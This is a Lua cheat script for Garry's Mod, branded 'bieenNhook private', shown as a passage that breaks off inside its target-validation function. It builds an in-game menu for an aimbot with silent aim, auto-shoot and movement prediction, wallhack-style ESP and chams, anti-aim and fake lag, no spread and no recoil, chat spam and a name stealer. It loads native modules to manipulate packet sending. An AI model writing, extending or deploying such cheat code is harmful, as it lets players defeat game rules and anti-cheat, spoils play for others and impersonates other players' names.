/*  	   
LOCALISATION  	   
*/  	   
  	   
local vgui = vgui;  	   
local surface = surface;  	   
local render = render;  	   
local Color = Color;  	   
local input = input;  	   
local hook = hook;  	   
local next = next;  	   
local timer = timer;  	   
local util = util;  	   
local player = player;  	   
local Vector = Vector;  	   
local Angle = Angle;  	   
local bit = bit;  	   
local FindMetaTable = FindMetaTable;  	   
local team = team;  	   
local LocalPlayer = LocalPlayer;  	   
local draw = draw;  	   
local require = require;  	   
local debug = debug;  	   
local table = table;  	   
local Entity = Entity;  	   
local ScrW, ScrH = ScrW, ScrH;  	   
local RunCommand = RunConsoleCommand;  	   
local GAMEMODE = GAMEMODE;  	   
local CurTime = CurTime;  	   
local cam = cam;  	   
local CreateMaterial = CreateMaterial;  	   
local pmt = FindMetaTable("Player");  	   
local emt = FindMetaTable("Entity");  	   
local cmt = FindMetaTable("CUserCmd");  	   
local amt = FindMetaTable("Angle");  	   
local vmt = FindMetaTable("Vector");  	   
local imt = FindMetaTable("IMaterial");  	   
local wmt = FindMetaTable("Weapon");  	   
local fake = emt.EyeAngles(LocalPlayer()) || Angle(0,0,0);  	   
  	   
/*  	   
TABLES  	   
*/  	   
  	   
local AimValid = {};  	   
local EspValid = {};  	   
local cones = {};  	   
  	   
local function GMChecker()  	   
	if (engine.ActiveGamemode() == "terrortown") then  	   
		return 1;  	   
	elseif (engine.ActiveGamemode() == "murder") then  	   
		return 2;  	   
	elseif (engine.ActiveGamemode() == "darkrp") then  	   
		return 3;  	   
	elseif (engine.ActiveGamemode() == "stronghold") then  	   
		return 4;  	   
	else  	   
		return 5;  	   
	end  	   
end  	   
  	   
/*  	   
FONTS  	   
*/  	   
  	   
surface.CreateFont("ESPFont", {  	   
	font = "HaxrCorp S8 Standard",  	   
	size = 14,  	   
	antialias = false,  	   
	outline  = true,  	   
})  	   
  	   
surface.CreateFont("MenuFont", {  	   
	font = "HaxrCorp S8 Standard",  	   
	size = 14,  	   
	antialias = false,  	   
	shadow = true,  	   
})

surface.CreateFont("Watermark", {
	font = "Consolas",
	size = 14,
	weight = 450,
	shadow = false,
	antialias = false,
	outline	= true,
});  	   
  	   
surface.CreateFont("_MenuFont", {  	   
	font = "HaxrCorp S8 Standard",  	   
	size = 12,  	   
	antialias = false,  	   
	shadow = true,  	   
})  	   
  	   
/*  	   
MATS  	   
*/  	   
  	   
local CMatZ = CreateMaterial("CMatZ", "VertexLitGeneric", {  	   
	["$ignorez"] = 1,  	   
	["$basetexture"] = "models/debug/debugwhite",  	   
});  	   
  	   
local CMat = CreateMaterial("CMat", "VertexLitGeneric", {  	   
	["$ignorez"] = 0,  	   
	["$basetexture"] = "models/debug/debugwhite",  	   
});  	   
  	   
/*  	   
MODULES  	   
*/  	   
  	   
require("dickwrap");  	   
require("bsendpacket");  	   
  	   
/*  	   
OPTIONS  	   
*/  	   
  	   
local options = {  	   
	{	  	   
		"Aimbot",  	   
		{"Active", false, "Checkbox"},  	   
		{"Targeting Algorithm", "NextShot", "Selection", {"NextShot", "Distance", "Angle"}},  	   
		{"Filters", nil, "Break"},  	   
		{"Ignore Team", false, "Checkbox"},  	   
		--{"Ignore Team Colour", false, "Checkbox"},  	   
		{"Ignore Steam Friends", false, "Checkbox"},  	   
		{"Ignore Bots", false, "Checkbox"},  	   
		{"Ignore Admins", false, "Checkbox"},  	   
		{"Ignore Spawn Protected", false, "Checkbox"},  	   
		{"Legit Settings", nil, "Break"},  	   
		{"On Key", false, "Checkbox"},  	   
		{"On Mouse", false, "Checkbox"},  	   
		{"Smooth", false, "Checkbox"},  	   
		{"Smooth Int", 0.01, "Slider", {0.01, 0.99, 2}},  	   
		{"Visual Effects", nil, "Break"},  	   
		{"Silent", false, "Checkbox"},  	   
		{"Perfect Silent", false, "Checkbox"},  	   
		{"Automation", nil, "Break"},  	   
		{"Auto Shoot", false, "Checkbox"},  	   
		{"Auto Pistol", false, "Checkbox"},  	   
		{"Rage Settings", nil, "Break"},  	   
		{"Bullet Time", false, "Checkbox"},  	   
		{"Static", false, "Checkbox"},  	   
		{"Aim Adjustment", nil, "Break"},  	   
		{"Body Aim", false, "Checkbox"},  	   
		{"Prediction", false, "Checkbox"},  	   
		{"Aim Position", "Bone", "Selection", {"Bone", "Hitbox"}}  	   
	},  	   
	  	   
	{  	   
		"ESP",  	   
		{"Active", false, "Checkbox"},  	   
		{"Filters", nil, "Break"},  	   
		{"Show Players", false, "Checkbox"},  	   
		{"Show NPC's", false, "Checkbox"},  	   
		{"Show SENT's", false, "Checkbox"},  	   
		{"Basic", nil, "Break"},  	   
		{"Box Type", "2D", "Selection", {"2D", "3D"}},  	   
		{"Box", false, "Checkbox"},  	   
		{"Filled Box", false, "Checkbox"},  	   
		{"Healthbar", false, "Checkbox"},  	   
		{"Armourbar", false, "Checkbox"},  	   
		{"Aim Pos", false, "Checkbox"},  	   
		{"Skeleton", false, "Checkbox"},  	   
		{"Text", nil, "Break"},  	   
		{"Name", false, "Checkbox"},  	   
		{"Health", false, "Checkbox"},  	   
		{"Armour", false, "Checkbox"},  	   
		{"Weapon", false, "Checkbox"},  	   
		{"Distance", false, "Checkbox"},  	   
		{"SteamID", false, "Checkbox"},  	   
		{"Money", false, "Checkbox"},  	   
		{"Points", false, "Checkbox"},  	   
		{"Rank", false, "Checkbox"},  	   
		{"Fancy", nil, "Break"},  	   
		{"Barrel", false, "Checkbox"},  	   
		{"HitBox", false, "Checkbox"},  	   
		{"Filled HitBox", false, "Checkbox"},  	   
		{"Snapline", false, "Checkbox"},  	   
		{"Snapline Pos", "Center", "Selection", {"Bottom", "Center"}},  	   
		{"Material", nil, "Break"},  	   
		{"Chams", false, "Checkbox"},  	   
		{"Weapon Chams", false, "Checkbox"},  	   
		{"XQZ", false, "Checkbox"},  	   
		{"Chams Mat", "Plain", "Selection", {"Solid", "Plain"}}  	   
	},  	   
	  	   
	{  	   
		"Visuals",  	   
		{"Perspective", nil, "Break"},  	   
		{"FoV", false, "Checkbox"},  	   
		{"Third Person", false, "Checkbox"},  	   
		{"FoV Int", 120, "Slider", {90, 150, 0}},  	   
		{"Third Person Int", 10, "Slider", {10, 20, 0}},  	   
		{"Sky", false, "Checkbox"},  	   
		{"Sky Type", "None", "Selection", {"None", "Rave"}},  	   
		{"Viewmodel", nil, "Break"},  	   
		{"No Hands", false, "Checkbox"},  	   
		{"Viewmodel", false, "Checkbox"},  	   
		{"Viewmodel Type", "Wireframe", "Selection", {"Wireframe", "Solid"}},  	   
		--{"Laser", true, "Checkbox"},  	   
		{"Material", nil, "Break"},  	   
		{"Fullbright", false, "Checkbox"},  	   
		{"ASUS Walls", 1, "Slider", {0.01, 1, 2}},  	   
		{"Miscellaneous", nil, "Break"},  	   
		{"Crosshair", false, "Checkbox"},  	   
		{"Watermark", true, "Checkbox"},  	   
		{"Crosshair Type", "Simple", "Selection", {"Simple", "Generic", "Aimware"}},  	   
		--{"Render", nil, "Break"},  	   
		--{"Spy Camera", true, "Checkbox"}  	   
	},  	   
	  	   
	{  	   
		"Miscellaneous",  	   
		{"Automation", nil, "Break"},  	   
		{"Bunny Hop", false, "Checkbox"},  	   
		{"Edge Jump", false, "Checkbox"},  	   
		{"Auto Pistol", false, "Checkbox"},  	   
		{"Auto Aim", false, "Checkbox"},  	   
		{"Auto Use", false, "Checkbox"},  	   
		{"Auto Flash", false, "Checkbox"},  	   
		{"Auto Strafer", nil, "Break"},  	   
		{"Auto Strafer", false, "Checkbox"},  	   
		{"View Fix", false, "Checkbox"},  	   
		{"Hack vs Hack", nil, "Break"},  	   
		{"FakeLag", false, "Checkbox"},  	   
		{"FakeLag Int", 14, "Slider", {1, 14, 0}},  	   
		{"Anti-Aim", false, "Checkbox"},  	   
		{"Selection", "FakeDown", "Anti-Aim X", {"FakeDown", "FakeUp", "Jitter", "OOB"}},  	   
		{"Selection", "FakeSide", "Anti-Aim Y", {"FakeSide", "Random"}},  	   
		{"Removals", nil, "Break"},  	   
		{"No Spread", false, "Checkbox"},  	   
		{"No Recoil", false, "Checkbox"},  	   
		{"No Punch", false, "Checkbox"},  	   
		{"No Visual Recoil", false, "Checkbox"},  	   
		{"Other", nil, "Break"},
		{"Chatspam", false, "Checkbox"}, 	
		{"Namestealer", false, "Checkbox"},  	   
		{"Namestealer Type", "Steam", "Selection", {"Steam", "DarkRP"}},  	   
		{"Namestealer Int", 6, "Slider", {1, 30, 0}}  	   
	},  	   
	  	   
	{  	   
		"Colours",  	     
		{"Team", nil, "Break"},  	   
		{"Team - R", 40, "Slider", {0, 255, 0}},  	   
		{"Team - G", 120, "Slider", {0, 255, 0}},  	   
		{"Team - B", 250, "Slider", {0, 255, 0}},  	   
		{"Enemy", nil, "Break"},  	   
		{"Enemy - R", 250, "Slider", {0, 255, 0}},  	   
		{"Enemy - G", 120, "Slider", {0, 255, 0}},  	   
		{"Enemy - B", 40, "Slider", {0, 255, 0}},  	   
		{"Npc", nil, "Break"},  	   
		{"Npc - R", 240, "Slider", {0, 255, 0}},  	   
		{"Npc - G", 130, "Slider", {0, 255, 0}},  	   
		{"Npc - B", 240, "Slider", {0, 255, 0}},  	   
		{"Entity", nil, "Break"},  	   
		{"Entity - R", 200, "Slider", {0, 255, 0}},  	   
		{"Entity - G", 200, "Slider", {0, 255, 0}},  	   
		{"Entity - B", 200, "Slider", {0, 255, 0}}  	   
	}  	   
};  	   
  	   
/*  	   
FLOATS  	   
*/  	   
  	   
local floats = {  	   
	{	  	   
		"Key",  	   
		{KEY_INSERT, false, false}  	   
	},  	   
	  	   
	{	  	   
		"Mouse",  	   
		{MOUSE_LEFT, false, false}  	   
	},  	   
	  	   
	{	  	   
		"Menu",  	   
		{"Active Tab", "Aimbot"},  	   
		{"Visible", true},  	   
		{"Scroll", 0},  	   
		{"Scroller", false},  	   
		{"Scroller Pos", 0},  	   
	},  	   
	  	   
	{  	   
		"Aimbot",  	   
		{"Aiming", false}  	   
	},  	   
	  	   
	{  	   
		"Visuals",  	   
		{"ASUS Walls", 1}  	   
	},  	   
	  	   
	{  	   
		"Miscellaneous",  	   
		{"Auto Pistol", false},  	   
		{"Auto Aim", false},  	   
		{"Auto Use", false},  	   
		{"Auto Flash", false},  	   
		{"FakeLag Int", 0}  	   
	},  	   
	  	   
	{  	   
		"Other",  	   
		{"Cur Time", CurTime()+engine.TickInterval()},  	   
		{"GM", GMChecker()}  	   
	}  	   
}  	   
  	   
/*  	   
MENU FUNCS  	   
*/  	   
  	   
local function gVal(t, c, o)  	   
	for k,v in next, t do  	   
		if (c != t[k][1]) then continue; end  	   
		for i = 2, #t[k] do  	   
			if (t[k][i][1] != o) then continue; end  	   
			if (t[k][i][3] == "Break") then continue; end  	   
			return t[k][i][2];  	   
		end  	   
	end  	   
end  	   
  	   
local function sVal(t, c, o, v)  	   
	for k,_v in next, t do  	   
		if (c != t[k][1]) then continue; end  	   
		for i = 2, #t[k] do  	   
			if (t[k][i][1] != o) then continue; end  	   
			t[k][i][2] = v;  	   
		end  	   
	end  	   
	return v;  	   
end  	   
  	   
local function UpdateKeys()  	   
	for i = 1, 2 do  	   
		for _i = 2, #floats[i] do  	   
			floats[i][_i][3] = floats[i][_i][2];  	   
			floats[i][_i][2] = (i == 1) && input.IsKeyDown(floats[i][_i][1]) || (i == 2) && input.IsMouseDown(floats[i][_i][1]);  	   
		end  	   
	end  	   
end  	   
  	   
local function gKey(c, o, t)  	   
	for k, v in next, floats do  	   
		if (c != floats[k][1] || k == 3) then continue; end  	   
		for _k, _v in next, floats[k] do  	   
			if (floats[k][_k][1] != o || _k == 1) then continue; end  	   
			if (t == 1) then  	   
				return floats[k][_k][2] && !floats[k][_k][3];  	   
			elseif (t == 2) then  	   
				return !floats[k][_k][2] && floats[k][_k][3];  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function CursorHovering(x, y, w, h, m)  	   
	local cx, cy = input.GetCursorPos();  	   
	local px, py = m:GetPos();  	   
	x = x + px;  	   
	y = y + py;  	   
	return (cx > x && cx < (x+w) && cy > y && cy < (y+h));  	   
end  	   
  	   
/*  	   
DRAWING  	   
*/  	   
  	   
local function DrawRect(x, y, w, h, c)  	   
	surface.SetDrawColor(c);  	   
	surface.DrawRect(x, y, w, h);  	   
end  	   
  	   
local function DrawOutlinedRect(x, y, w, h, c)  	   
	surface.SetDrawColor(c);  	   
	surface.DrawOutlinedRect(x, y, w, h);  	   
end  	   
  	   
local function DrawText(s, f, x, y, c, ax, ay)  	   
	surface.SetFont(f);  	   
	local w, h = surface.GetTextSize(s);  	   
	surface.SetTextColor(c);  	   
	x = (ax == "c" && x - w/2) || (ax == "r" && x - w) || x;  	   
	y = (ay == "c" && y - h/2) || (ay == "b" && y - h) || y;  	   
	surface.SetTextPos(math.ceil(x), math.ceil(y));  	   
	surface.DrawText(s);  	   
	return w, h;  	   
end  	   
  	   
local function DrawLine(x, y, _x, _y, c)  	   
	surface.SetDrawColor(c);  	   
	surface.DrawLine(x, y, _x, _y);  	   
end  	   
  	   
local function DrawTab(s, x, w, h, c, m)  	   
	DrawRect(x, 24, w, h, (s == gVal(floats, "Menu", "Active Tab") && c || CursorHovering(x, 24, w, h, m) && !gVal(floats, "Menu", "Scroller") && Color(c.r*1.1, c.g*1.1, c.b*1.1) || Color(c.r/1.5, c.g/1.5, c.b/1.5)));  	   
	DrawText(s, "_MenuFont", x+w/2, 24+h/2, Color(255, 255, 255), "c", "c");  	   
	if (CursorHovering(x, 24, w, h, m) && !gVal(floats, "Menu", "Scroller") && input.IsMouseDown(MOUSE_LEFT)) then  	   
		sVal(floats, "Menu", "Scroll", 0);  	   
		sVal(floats, "Menu", "Active Tab", s);  	   
	end  	   
end  	   
  	   
local function DrawCheckbox(s, y, c, o, _c, m)  	   
	DrawOutlinedRect(10, y, 10, 10, Color(0,0,0));  	   
	DrawRect(11, y+1, 8, 8, Color(255,255,255));  	   
	local w, h = surface.GetTextSize(s);  	   
	DrawRect(12, y+2, 6, 6, (gVal(options, c, o) && _c || CursorHovering(10, y, 15 + w, 10, m) && !gVal(floats, "Menu", "Scroller") && Color(150, 150, 150) || Color(255,255,255)));  	   
	DrawText(s, "_MenuFont", 23, y+4, Color(255, 255, 255), "l", "c");  	   
	if (CursorHovering(10, y, 15 + w, 10, m) && !gVal(floats, "Menu", "Scroller") && gKey("Mouse", MOUSE_LEFT, 2)) then  	   
		sVal(options, c, o, !gVal(options, c, o));  	   
	end  	   
end  	   
  	   
local function DrawBreak(s, y, c, m)  	   
	surface.SetFont("_MenuFont");  	   
	local w, h = surface.GetTextSize(s);  	   
	DrawText(s, "_MenuFont", 370, y+5, CursorHovering(370 - w, y, w, h, m) && !gVal(floats, "Menu", "Scroller") && Color(math.random(255,255),math.random(255,255),math.random(255,255)) || c, "r", "c");  	   
	DrawLine(10, y+5, 366 - w, y+5, c);  	   
end  	   
  	   
local function DrawSlider(s, y, c, o, _s, b, d, _c, m)  	   
	local x, _y = input.GetCursorPos();  	   
	local _x, __y = m:GetPos();  	   
	DrawText(s, "_MenuFont", 13, y+4, Color(255, 255, 255), "l", "c");  	   
	DrawText(math.floor(gVal(options, c, o)*10^d)/10^d, "_MenuFont", 370, y+4, Color(255, 255, 255), "r", "c");  	   
	DrawLine(15, y+25, 365, y+25, _c);  	   
	DrawOutlinedRect(14, y+24, 353, 3, Color(0,0,0));  	   
	DrawOutlinedRect(((gVal(options, c, o)-_s)/(b-_s)*350)+10, y+15, 10, 20, Color(0,0,0));  	   
	DrawRect(((gVal(options, c, o)-_s)/(b-_s)*350)+11, y+16, 8, 18, Color(255,255,255));  	   
	DrawRect(((gVal(options, c, o)-_s)/(b-_s)*350)+12, y+17, 6, 16, CursorHovering(((gVal(options, c, o)-_s)/(b-_s)*350)+10, y+15, 10, 20, m) && !gVal(floats, "Menu", "Scroller") && Color(150,150,150) || Color(255,255,255));  	   
	if (CursorHovering(15, y+15, 351, 20, m) && input.IsMouseDown(MOUSE_LEFT) && !gVal(floats, "Menu", "Scroller")) then  	   
		local val = (x-_x-15)/350*(b-_s)+_s;  	   
		sVal(options, c, o, val);  	   
	end  	   
end  	   
  	   
local function DrawSelection(s, y, c, o, t, _c, m)  	   
	for i = 1, #t do  	   
		if (t[i] == gVal(options, c, o)) then  	   
			q=i;  	   
		end  	   
	end  	   
	DrawText(s, "_MenuFont", 13, y+4, _c, "l", "c");  	   
	DrawText(q, "_MenuFont", 370, y+4, _c, "r", "c");  	   
	DrawRect(11, y+16, 18, 18, _c);  	   
	DrawRect(12, y+17, 16, 16, CursorHovering(10, y+15, 20, 20, m) && Color(150,150,150) || _c);  	   
	DrawLine(15, y+25, 25, y+25, Color(0,0,0));  	   
	DrawLine(29, y+15, 29, y+35, Color(0,0,0));  	   
	DrawOutlinedRect(10, y+15, 360, 20, Color(0,0,0));  	   
	DrawRect(351, y+16, 18, 18, _c);  	   
	DrawRect(352, y+17, 16, 16, CursorHovering(350, y+15, 20, 20, m) && Color(150,150,150) || _c);  	   
	DrawLine(355, y+25, 365, y+25, Color(0,0,0));  	   
	DrawLine(360, y+20, 360, y+30, Color(0,0,0));  	   
	DrawLine(350, y+15, 350, y+35, Color(0,0,0));  	   
	DrawRect(30, y+16, 320, 18, Color(150,150,150));  	   
	DrawText(gVal(options, c, o), "_MenuFont", 190, y+25, CursorHovering(30, y+15, 320, 20, m) && Color(math.random(200,200),math.random(200,200),math.random(200,200)) || Color(255,255,255), "c", "c");  	   
	if (CursorHovering(10, y+15, 20, 20, m) && gKey("Mouse", MOUSE_LEFT, 2)) then  	   
		sVal(options, c, o, (t[math.Clamp(q-1, 1, #t)]));  	   
	end  	   
	if (CursorHovering(350, y+15, 20, 20, m) && gKey("Mouse", MOUSE_LEFT, 2)) then  	   
		sVal(options, c, o, (t[math.Clamp(q+1, 1, #t)]));  	   
	end  	   
	if (CursorHovering(30, y+15, 320, 20, m) && gKey("Mouse", MOUSE_LEFT, 2)) then  	   
		sVal(options, c, o, (t[math.random(1, #t)]));  	   
	end  	   
end  	   
  	   
local function DrawScroller(_c, m, my)  	   
	local sw, sh = m:GetWide(), m:GetTall();  	   
	local x, y = input.GetCursorPos();  	   
	local _x, _y = m:GetPos();  	   
	DrawRect(sw-22, 45, 18, 18, _c);  	   
	DrawRect(sw-21, 46, 16, 16, CursorHovering(sw-23, 44, 20, 20, m) && Color(150,150,150) || _c);  	   
	DrawLine(sw-13, 51, sw-19, 56, Color(0,0,0));  	   
	DrawLine(sw-14, 51, sw-8, 56, Color(0,0,0));  	   
	DrawLine(sw-23, 63, sw-4, 63, Color(0,0,0));  	   
  	   
	DrawRect(sw-22, 64, 18, 413, Color(110, 110, 110));  	   
	DrawRect(sw-22, 64-((gVal(floats, "Menu", "Scroll")/490)*414), 18, (414+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*414)) > 413 && 413 || 414+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*414), _c);  	   
	DrawRect(sw-21, 65-((gVal(floats, "Menu", "Scroll")/490)*414), 16, (414+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*414)) > 413 && 411 || 414+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*414)-2, CursorHovering(sw-22, 64-((gVal(floats, "Menu", "Scroll")/490)*414), 18, 413+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*413), m) && Color(150,150,150) || _c);  	   
	  	   
	DrawRect(sw-22, 478, 18, 18, _c);  	   
	DrawRect(sw-21, 479, 16, 16, CursorHovering(sw-23, 477, 20, 20, m) && Color(150,150,150) || _c);  	   
	DrawLine(sw-13, 489, sw-19, 484, Color(0,0,0));  	   
	DrawLine(sw-14, 489, sw-8, 484, Color(0,0,0));  	   
	DrawLine(sw-23, 477, sw-4, 477, Color(0,0,0));  	   
	DrawOutlinedRect(sw-23, 44, 20, 453, Color(0,0,0));  	   
	  	   
	if (CursorHovering(sw-23, 44, 20, 20, m) && input.IsMouseDown(MOUSE_LEFT)) then  	   
		sVal(floats, "Menu", "Scroll", (gVal(floats, "Menu", "Scroll") + 1) > 0 && gVal(floats, "Menu", "Scroll") || (gVal(floats, "Menu", "Scroll") + 1));  	   
	end  	   
	  	   
	if (CursorHovering(sw-23, 477, 20, 20, m) && input.IsMouseDown(MOUSE_LEFT)) then  	   
		sVal(floats, "Menu", "Scroll", (gVal(floats, "Menu", "Scroll") - 1) < (gVal(floats, "Menu", "Scroll")+490-my) && gVal(floats, "Menu", "Scroll") || (gVal(floats, "Menu", "Scroll") - 1));  	   
	end  	   
	  	   
	if (CursorHovering(sw-22, 64-((gVal(floats, "Menu", "Scroll")/490)*414), 18, 413+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*413), m) && gKey("Mouse", MOUSE_LEFT, 1) && !gVal(floats, "Menu", "Scroller")) then  	   
		sVal(floats, "Menu", "Scroller", true);  	   
		sVal(floats, "Menu", "Scroller Pos", -gVal(floats, "Menu", "Scroll")-(((y - _y)*490)/414));  	   
	end  	   
	  	   
	if (gVal(floats, "Menu", "Scroller")) then  	   
		if (input.IsMouseDown(MOUSE_LEFT) && (414+(((gVal(floats, "Menu", "Scroll")+490-my)/490)*414)) < 413) then  	   
			local num = -(((y - _y)*490)/414) - gVal(floats, "Menu", "Scroller Pos");  	   
			sVal(floats, "Menu", "Scroll", num >= 0 && 0 || num <= (gVal(floats, "Menu", "Scroll")+490-my) && (gVal(floats, "Menu", "Scroll")+490-my) || num);  	   
		else  	   
			sVal(floats, "Menu", "Scroller", false);  	   
		end  	   
	end  	   
end  	   
  	   
/*  	   
MENU  	   
*/  	   
  	   
local MainMenu = vgui.Create("DFrame")  	   
MainMenu:SetSize(400, 500)  	   
MainMenu:ShowCloseButton(false)  	   
MainMenu:SetTitle("")  	   
MainMenu:MakePopup()  	   
MainMenu:Center()  	   
function MainMenu.Paint(self)  	   
	local sw, sh = self:GetWide(), self:GetTall(); 
	rainbow = {}
	rainbow.R = math.sin(CurTime() * 4) * 127 + 128
	rainbow.G = math.sin(CurTime() * 4 + 2) * 127 + 128
	rainbow.B = math.sin(CurTime() * 4 + 4) * 127 + 128	
	DrawOutlinedRect(0, 0, sw, sh, Color(0, 0, 0));  	   
	DrawRect(1, 1, sw-2, sh-2, Color(rainbow.R, rainbow.G, rainbow.B));  	   
	DrawRect(4, 24, sw-8, sh-28, Color(80, 80, 80));  	   
	local menuy = 50 + gVal(floats, "Menu", "Scroll");  	   
	for k,v in next, options do  	   
		if (gVal(floats, "Menu", "Active Tab") == options[k][1]) then  	   
			for i = 2, #options[k] do  	   
				if (options[k][i][3] == "Checkbox") then  	   
					if (menuy > 35) then  	   
						DrawCheckbox(options[k][i][1], menuy, options[k][1], options[k][i][1], Color(rainbow.R, rainbow.G, rainbow.B), self);  	   
					end  	   
					menuy = menuy + 15;  	   
				elseif (options[k][i][3] == "Slider") then  	   
					if (menuy > 10) then  	   
						DrawSlider(options[k][i][1], menuy, options[k][1], options[k][i][1], options[k][i][4][1], options[k][i][4][2], options[k][i][4][3], Color(255,255,255), self);  	   
					end  	   
					menuy = menuy + 40;  	   
				elseif (options[k][i][3] == "Selection") then  	   
					if (menuy > 10) then  	   
						DrawSelection(options[k][i][1], menuy, options[k][1], options[k][i][1], options[k][i][4], Color(255,255,255), self);  	   
					end  	   
					menuy = menuy + 40;  	   
				elseif (options[k][i][3] == "Break") then  	   
					if (menuy > 35) then  	   
						DrawBreak(options[k][i][1], menuy, Color(255,255,255), self);  	   
					end  	   
					menuy = menuy + 15;  	   
				end  	   
			end  	   
		end  	   
	end  	   
	for k,v in next, options do  	   
		DrawTab(options[k][1], 4+(((sw-8)/#options)*(k-1)), math.ceil((sw-8)/#options), 20, Color(rainbow.R, rainbow.G, rainbow.B), self);  	   
	end  	   
	DrawRect(1, 1, sw-2, 22, Color(rainbow.R, rainbow.G, rainbow.B));  	   
	DrawText("bieenNhook private", "MenuFont", self:GetWide()/2, 11, Color(255,255,255), "c", "c");  	   
	--DrawRect(sw-53, 1, 50, 20, CursorHovering(sw-53, 1, 50, 20, self) && Color(220, 100, 100) || Color(200, 80, 80));  	   
	--if (CursorHovering(sw-53, 1, 50, 20, self)) then  	   
	--self:SetDraggable(false);  	   
	--	if (gKey("Mouse", MOUSE_LEFT, 1)) then  	   
	--		sVal(floats, "Menu", "Visible", false)  	   
	--		self:SetVisible(false);  	   
	--	end  	   
	--else  	   
	--	self:SetDraggable(true);  	   
	--end  	   
	DrawOutlinedRect(3, 23, sw-6, sh-26, Color(0, 0, 0));  	   
	DrawRect(4, sh-3, sw-8, 2, Color(rainbow.R, rainbow.G, rainbow.B));  	   
	DrawLine(4,sh-1,sw-4,sh-1, Color(0,0,0));  	   
	DrawScroller(Color(255,255,255), self, menuy);  	   
end  	   
  
--[[  
local SpyCamera = vgui.Create("DFrame")  	   
SpyCamera:SetSize(304, 190)  	   
SpyCamera:ShowCloseButton(false)  	   
SpyCamera:SetTitle("")  	   
SpyCamera:MakePopup()  	   
SpyCamera:SetKeyboardInputEnabled(false);  	   
SpyCamera:SetPos(ScrW()/2-160, 5)  	   
function SpyCamera.Paint(self)  	   
	local sw, sh = self:GetWide(), self:GetTall();  	   
	DrawOutlinedRect(0, 0, sw, sh, Color(0, 0, 0));  	   
	DrawRect(1, 1, sw-2, sh-2, Color(gVal(options, "Colours", "Menu - R"), gVal(options, "Colours", "Menu - G"), gVal(options, "Colours", "Menu - B")));  	   
	DrawText("Spy Camera", "MenuFont", self:GetWide()/2, 11, Color(255,255,255), "c", "c");  	   
	DrawOutlinedRect(3, 23, sw-6, sh-26, Color(0, 0, 0));  	   
	DrawRect(sw-53, 1, 50, 20, CursorHovering(sw-53, 1, 50, 20, self) && Color(220, 100, 100) || Color(200, 80, 80));  	   
	if (CursorHovering(sw-53, 1, 50, 20, self)) then  	   
		self:SetDraggable(false);  	   
		if (gKey("Mouse", MOUSE_LEFT, 1)) then  	   
			sVal(options, "Visuals", "Spy Camera", false)  	   
			self:SetVisible(false);  	   
		end  	   
	else  	   
		self:SetDraggable(true);  	   
	end  	   
	self:SetMouseInputEnabled(gVal(floats, "Menu", "Visible"))  	   
	local SpyCam = {}  	   
	SpyCam.x = select(1, self:GetPos()) + 4;  	   
	SpyCam.y = select(2, self:GetPos()) + 24;  	   
	SpyCam.w = sw-8;  	   
	SpyCam.h = sh-28;  	   
	SpyCam.angles = Angle(0,fake.y-180,0);  	   
	SpyCam.origin = emt.EyePos(LocalPlayer());  	   
	render.RenderView(SpyCam)  	   
end
--]]	   
  	   
local function Menu()  	   
	if (gKey("Key", KEY_INSERT, 1) && !pmt.IsTyping(LocalPlayer())) then  	   
		sVal(floats, "Menu", "Visible", !gVal(floats, "Menu", "Visible"))  	   
		MainMenu:SetVisible(gVal(floats, "Menu", "Visible"))   	   
	end  	   
	--SpyCamera:SetVisible(gVal(options, "Visuals", "Spy Camera"))  	   
end  	   
  	   
/*  	   
OTHER  	   
*/  	   
  	   
local function Rotate(v, vec, num)  	   
        local origin = Vector(v:GetPos().x, v:GetPos().y, vec.z);  	   
        local pos = vec-origin;  	   
        local ang = math.deg(math.atan2(pos.y,pos.x));  	   
        local len = math.sqrt(pos.x^2 + pos.y^2);  	   
        local num = -num;  	   
         	   
        local x = math.cos(math.rad(ang + num)) * len;  	   
        local y = math.sin(math.rad(ang + num)) * len;  	   
         	   
        local final = Vector(origin.x + x, origin.y + y, origin.z)  	   
         	   
        return final;  	   
end  	   
  	   
local function GetAimVec(v)  	   
	if (v == nil) then return; end  	   
	local vec = Vector(0,0,0);  	   
	if (gVal(options, "Aimbot", "Aim Position") == "Bone") then  	   
		if (!gVal(options, "Aimbot", "Body Aim")) then  	   
			local pos, ang = emt.GetBonePosition(v, 6);  	   
			vec = pos +  amt.Forward(ang) * 2;  	   
		else  	   
			local pos, ang = emt.GetBonePosition(v, 0);  	   
			vec = pos;  	   
		end  	   
	elseif (gVal(options, "Aimbot", "Aim Position") == "Hitbox") then  	   
		if (!gVal(options, "Aimbot", "Body Aim")) then  	   
			local bone = emt.GetHitBoxBone(v, 0, 0);  	   
			local min, max = emt.GetHitBoxBounds(v, 0, 0);  	   
			local bonepos = emt.GetBonePosition(v, bone);  	   
			vec = bonepos + ((min + max) * .5);  	   
		else  	   
			local bone = emt.GetHitBoxBone(v, 15, 0);  	   
			local min, max = emt.GetHitBoxBounds(v, 15, 0);  	   
			local bonepos = emt.GetBonePosition(v, bone);  	   
			vec = bonepos + ((min + max) * .5);  	   
		end  	   
	end  	   
	  	   
	if (gVal(options, "Aimbot", "Prediction")) then  	   
		vec = vec - (emt.GetVelocity(LocalPlayer()) * engine.TickInterval()) + (emt.GetVelocity(v) * (RealFrameTime()/25));  	   
	end  	   
	  	   
	if (gVal(options, "Aimbot", "Perfect Silent") && !bSendPacket) then  	   
		if (gVal(options, "Miscellaneous", "FakeLag")) then  	   
			vec = vec + emt.GetVelocity(v) * engine.TickInterval() * (math.floor(gVal(options, "Miscellaneous", "FakeLag Int")) - gVal(floats, "Miscellaneous", "FakeLag Int"));  	   
		else  	   
			vec = vec + emt.GetVelocity(v) * engine.TickInterval() * (2 - gVal(floats, "Miscellaneous", "FakeLag Int"));  	   
		end  	   
	end  	   
	  	   
	return vec;  	   
end  	   
  	   
local function GetAimPos(vec)  	   
	if (vec == nil) then return; end  	   
	local ang = vmt.Angle(vec - LocalPlayer():GetShootPos());  	   
	ang.p = ((ang.p + 90)%180)-90;  	   
	return ang;  	   
end  	   
  	   
local function GetAimValid(cmd)  	   
	AimValid = {};  	   
	if (gVal(options, "Aimbot", "Active")) then  	   
		for k, v in next, player.GetAll() do  	   
			if (!(v != LocalPlayer() && IsValid(v) && emt.Health(v) > 0 && !emt.IsDormant(v) && pmt.GetObserverTarget(LocalPlayer()) != v)) then continue; end  	   
